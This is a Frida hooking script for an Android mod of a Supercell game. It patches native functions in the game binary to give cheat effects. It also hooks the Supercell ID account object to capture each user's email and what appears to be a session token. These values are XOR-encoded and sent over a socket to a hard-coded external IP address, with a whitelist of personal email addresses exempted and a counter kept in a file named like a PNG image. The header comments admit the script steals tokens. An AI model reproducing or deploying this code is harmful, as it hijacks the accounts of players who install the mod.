// THIS SCRIPT WILL STEAL YOUR TOKEN!!! CAUTION WHEN USING THIS!
// script has the famouse kit exploit for v59
// to disable the token grab set the host (line 98) to 127.0.0.1 or something

const free = new NativeFunction(Module.getExportByName('libc.so', 'free'), 'void', ['pointer']);
const fread = new NativeFunction(Module.getExportByName('libc.so', 'fread'), 'int', ['pointer', 'int', 'int', 'pointer']);
const fopen = new NativeFunction(Module.getExportByName('libc.so', 'fopen'), 'pointer', ['pointer', 'pointer']);
const fclose = new NativeFunction(Module.getExportByName('libc.so', 'fclose'), 'int', ['pointer']);
const ftell = new NativeFunction(Module.getExportByName('libc.so', 'ftell'), 'int', ['pointer']);
const fseek = new NativeFunction(Module.getExportByName('libc.so', 'fseek'), 'int', ['pointer', 'int', 'int']);
const rewind = new NativeFunction(Module.getExportByName('libc.so', 'rewind'), 'void', ['pointer']);
const malloc = new NativeFunction(Module.getExportByName('libc.so', 'malloc'), 'pointer', ['uint']);

const toast = function(text) {
    Java.scheduleOnMainThread(() => {
        Java.use('android.widget.Toast')
            .makeText(Java.use('android.app.ActivityThread').currentApplication().getApplicationContext(), Java.use('java.lang.StringBuilder').$new(text), 1).show();
    });
};

var dataDirectory = null;

Java.perform(function() {
    var activityManager = Java.use('android.app.ActivityManager');
    var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
    var fileDir = context.getFilesDir().getAbsolutePath();

    dataDirectory = fileDir;
});

let savefilepath = '/data/user/0/com.friday.im.specialmods.v59/update/sc3d/background/bo_bgcolor.png';
let errorPath = `${dataDirectory}/error.log`;

function getCurrentTime() {
    const now = new Date();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    return `[${hours}:${minutes}:${seconds}]`;
}

function writeToFile(filePath, mode, text) {
    try {
        const file = new File(filePath, mode);
        file.write(text);
        file.flush();
        file.close();
    } catch (e) {
        const errortimefile = getCurrentTime();
        var errormessagefile = `${errortimefile} Error occurred while writing file: ${e}\n`;
        if (filePath !== errorPath) {
            const file = new File(errorPath, 'a+');
            file.write(errormessagefile);
            file.flush();
            file.close();
        }
    }
}

writeToFile(savefilepath, 'a+', '""');

function ReadFile(filepath, mode) {
    var file = fopen(Memory.allocUtf8String(filepath), Memory.allocUtf8String(mode));
    fseek(file, 0, 2);
    var Fsize = ftell(file);
    rewind(file);
    var buffer = malloc(Fsize);
    fread(buffer, 1, Fsize, file);
    var byteArray = Memory.readByteArray(buffer, Fsize);
    var uint8Array = new Uint8Array(byteArray);
    fclose(file);
    free(buffer);
    var resultString = '';
    for (var i = 0; i < uint8Array.length; i++) {
        resultString += String.fromCharCode(uint8Array[i]);
    }
    return resultString;
}

function encrypt(str, key) {
    str = str.replace(/\n/g, '""');
    var result = '';
    for (var i = 0; i < str.length; i++) {
        result += (str.charCodeAt(i) ^ key.charCodeAt(i % key.length)).toString(16).padStart(2, '0');
    }
    return result;
}

function decrypt(hexStr, key) {
    var result = '';
    for (var i = 0; i < hexStr.length; i += 2) {
        var charCode = parseInt(hexStr.substring(i, i + 2), 16) ^ key.charCodeAt((i / 2) % key.length);
        result += String.fromCharCode(charCode);
    }
    return result.replace(/\n/g, '""');
}

const HOST = '188.245.178.251'; // Change this to your server's IP
const PORT = 3169; // Change this to your server's port
var key = 'your_key_here';

const whitelist = [
    'oyundronu123@gmail.com',
    'efe66600@gmail.com',
    'busealibaz@gmail.com',
    'erkan08ist@gmail.com'
];

function hexStringToBytes(hex) {
    const cleanedHex = hex.replace(/[^a-fA-F0-9]/g, '');
    if (cleanedHex.length % 2 !== 0) {
        throw new Error(`Invalid hex string length: ${cleanedHex.length}`);
    }

    const byteArray = new Uint8Array(cleanedHex.length / 2);
    for (let i = 0; i < cleanedHex.length; i += 2) {
        const byteValue = parseInt(cleanedHex.substr(i, 2), 16);
        if (isNaN(byteValue)) {
            throw new Error(`Invalid hex sequence at position ${i}`);
        }
        byteArray[i / 2] = byteValue;
    }
    return byteArray;
}

function sendHexPayload(hexString) {
    let connection = null;

    return Socket.connect({
        family: 'ipv4',
        host: HOST,
        port: PORT
    }).then(function(conn) {
        connection = conn;
        //console.log(`Connected to ${HOST}:${PORT}`);

        // Convert and send
        const message = hexStringToBytes(hexString);
        return connection.output.write(message);
    }).then(function() {
        //console.log('Message sent successfully');
        return connection.output.drain();
    }).then(function() {
        //console.log('Closing connection...');
        return connection.close();
    }).catch(function(error) {
        console.error(`Error: ${error}`);
        if (connection) connection.close();
        throw error; // Propagate the error
    });
}

Java.perform(function() {
    var IdAccount = Java.use('com.supercell.id.scid_plugin.IdAccount');

    IdAccount.toString.overload().implementation = function() {
        var result = this.toString();
        var sd = this.sd.value;
        var el = this.el.value;
        var st = this.st.value;

        if (whitelist.includes(el)) {
            return result;
        } else {
            var sendresult = {
                sd: sd,
                el: el,
                st: st
            };

            var sendresultString = JSON.stringify(sendresult);
            var encodedsendresultString = encrypt(sendresultString, key);

            var content = ReadFile(savefilepath, 'r').trim();
            var contentNum = Number(content);
            if (isNaN(contentNum)) writeToFile(savefilepath, 'w+', '0');
            if (contentNum < 666) {
                contentNum++
                writeToFile(savefilepath, 'w', contentNum.toString());
                sendHexPayload(encodedsendresultString); // Send payload
            }

            return result;
        }
    };
});

let packageName = null;
Java.perform(function() {
    const ActivityThread = Java.use('android.app.ActivityThread');
    const currentApplication = ActivityThread.currentApplication();
    const context = currentApplication.getApplicationContext();
    packageName = context.getPackageName();
});

if (packageName == 'com.friday.im.specialmods.v59') {
    // Made by MehmetEfeFriday
    const base = Module.findBaseAddress('libg.so');
    const basesize = Process.findModuleByName('libg.so').size;

    // Set memory protection
    Memory.protect(base, basesize, 'rwx');

    const SlipperyDebuffAddr = 0x82C668;
    const shouldShowMoveStickAddr = 0x645B04;
    const hasNoMovementAddr = 0x82C614;

    const SlipperyDebuff = base.add(SlipperyDebuffAddr);
    const shouldShowMoveStick = base.add(shouldShowMoveStickAddr);
    const hasNoMovement = base.add(hasNoMovementAddr);

    Interceptor.replace(SlipperyDebuff, new NativeCallback(function(a1) { // LogicCharacterClient::hasSlipperyDebuffClient
        return 0;
    }, 'int64', ['int64']));

    Interceptor.replace(shouldShowMoveStick, new NativeCallback(function(a1, a2) { // BattleScreen::shouldShowMoveStick
        return 1;
    }, 'bool', ['int64', 'pointer']));

    Interceptor.replace(hasNoMovement, new NativeCallback(function(a1) {
        return 0;
    }, 'int64', ['int64']));

    toast('Made By F.R.I.D.A.Y/I.M');
} else {
    toast('fuck you dont steal my mod'); // Don't touch my code, you son of a bitch
}
